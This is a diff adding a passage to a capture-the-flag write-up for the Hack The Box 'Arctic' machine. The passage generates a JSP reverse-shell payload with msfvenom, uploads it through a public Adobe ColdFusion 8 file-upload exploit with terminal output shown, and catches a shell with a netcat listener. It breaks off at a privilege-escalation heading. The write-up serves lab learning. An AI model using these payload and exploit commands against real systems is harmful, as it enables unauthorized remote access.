@@ -156,6 +156,62 @@ We are logged in hehe
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b68ef508-0b5a-481f-80e6-f1ffdaa296c6)
 
+Now that we are logged in we can go ahead to upload a ```.jsp``` shell.
+
+
+
+# Exploitation
+
+Well, I found a script that'll help with the uploading, you can download it [here](https://github.com/nipunsomani/Adobe-ColdFusion-8-File-Upload-Exploit)
+
+Before running  the script, lets generate our jsp payload using msfvenom
+
+command:```msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.142 LPORT=1234 -f raw > abeg.jsp```
+
+Ensure you set the LHOST and LPORT to the appropriate values
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Arctic]
+└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.142 LPORT=1234 -f raw > abeg.jsp
+Payload size: 1498 bytes
+                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Arctic]
+└─$ ls -la abeg.jsp 
+-rw-r--r-- 1 bl4ck4non bl4ck4non 1498 Sep 24 12:19 abeg.jsp
+```
+Now, lets use our exploit to upload this payload
+
+command:```python2 exploit.py 10.129.110.118 8500 abeg.jsp```
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Arctic]
+└─$ python2 exploit.py 10.129.110.118 8500 abeg.jsp
+/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
+Sending payload...
+Successfully uploaded payload!
+Find it at http://10.129.110.118:8500/userfiles/file/exploit.jsp
+```
+Our payload has been uploaded successfully
+
+Navigating to the path were it was uploaded to
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/038eb12e-8dab-4367-8073-ff3bef7b634a)
+
+cool, now lets set up our netcat listener before clicking on the payload
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0e1c80f7-c574-4a65-8451-ed719f889c2a)
+
+Clicking on the payload and checking our netcat listener
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f56127ad-64a0-4c6a-83ce-d535bd35ce92)
+
+We have gotten a user shell😎, lets go ahead and escalate our privileges
+
+
+
+
+
+# Privilege Escalation
 
 
 
